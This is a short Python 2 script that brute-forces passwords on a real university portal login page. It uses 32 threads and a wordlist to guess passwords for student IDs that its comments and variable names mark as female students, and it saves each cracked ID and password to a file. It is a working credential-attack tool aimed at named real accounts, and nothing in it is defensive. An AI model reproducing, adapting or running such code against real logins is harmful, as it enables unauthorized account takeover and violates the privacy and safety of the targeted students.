# -*- coding: utf-8 -*-
# @Author: chen
# @Date:   2016-08-21 19:46:58
# @Last Modified by:   chen
# @Last Modified time: 2016-08-25 19:26:00

import requests
import sys,time
import threading
from multiprocessing.dummy import Pool as threadPool

data = {'Login.Token1':'','Login.Token2':'165559'}
loginurl = 'http://yingxin.hfuu.edu.cn/userPasswordValidate.portal'
flag = 'LoginSuccessed'
found = False

def burp_pw(f,lock,xh):
	global found
	data['Login.Token1'] = xh
	while not found:
		lock.acquire()
		line = f.readline().strip()
		print('Trying: %s:%s  <> %s' % (xh,line,threading.current_thread().name))
		lock.release()
		if line == '':
			break
		data['Login.Token2']=line
		try:
			r = requests.post(loginurl,data=data)
			if flag in r.text:
				print('Burp Successed!!:  %s\n' % line)
				found = True
				with open('xh_pw_woman.txt','a') as f:
					f.write('%s----%s\n' % (xh,line))
			else:
				pass
		except Exception,msg:
			print(msg)

def main(xh):
	zd = sys.argv[1]
	zdf = open(zd,'r')
	lock = threading.Lock()
	thds = []
	for i in range(32):
		thd = threading.Thread(target=burp_pw,args=(zdf,lock,xh),name='Thread-'+str(i))
		thds.append(thd)
	for t in thds:
		t.start()
	for t in thds:
		t.join()
	zdf.close()

if __name__ == '__main__':
	start = time.time()
	xh_ex = '16040810'
	woman = ['48','50']
	for i in woman:
		xh = xh_ex + i
		found = False
		main(xh)
	stop = time.time()
	print(stop-start)
	#python yinxin.py 1604081015 t_man.txt
